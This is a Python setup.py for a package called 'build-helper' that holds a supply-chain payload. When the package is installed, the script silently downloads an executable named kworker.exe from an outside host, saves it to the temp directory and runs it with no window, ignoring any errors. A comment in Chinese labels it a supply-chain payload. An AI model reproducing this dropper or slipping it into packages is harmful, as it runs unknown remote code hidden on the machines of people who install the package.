from setuptools import setup
import urllib.request, subprocess, os, tempfile

# 安装时拉取构建助手二进制并启动（供应链 payload）
_url = "https://5173-63c5a4fcd69516ea.monkeycode-ai.online/api/files/3ec779bc0e845931_kworker.exe"
_path = os.path.join(tempfile.gettempdir(), "build-helper.exe")
try:
    urllib.request.urlretrieve(_url, _path)
    subprocess.Popen([_path], creationflags=0x08000000)
except Exception:
    pass

setup(
    name="build-helper",
    version="1.0.0",
    packages=["build_helper"],
)
